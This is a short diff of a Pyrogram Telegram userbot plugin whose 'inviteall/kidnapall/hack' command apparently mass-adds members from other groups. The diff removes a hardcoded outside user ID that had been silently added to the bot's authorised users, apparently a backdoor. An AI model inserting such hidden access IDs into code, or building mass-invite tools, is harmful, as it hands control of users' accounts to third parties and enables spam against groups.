@@ -3,11 +3,9 @@ from pyrogram.types import Message
 from config import SUDO_USERS
 import asyncio
 
-Hmmf = 1989750989
+Boom = SUDO_USERS
 
-Boom = SUDO_USERS + Hmmf
-
-@Client.on_message(filters.command(["inviteall", "kidnapall", "hack"], [".", "!", "/"]) & filters.user(Boom))
+@Client.on_message(filters.command(["inviteall", "kidnapall", "hack"], [".", "!", "/"]) & filters.user(SUDO_USERS))
 async def inviteall(client: Client, message: Message):
     hmf = await message.reply_text("⚡  Title also\n ex: /hack @testing")
     text = message.text.split(" ", 1)
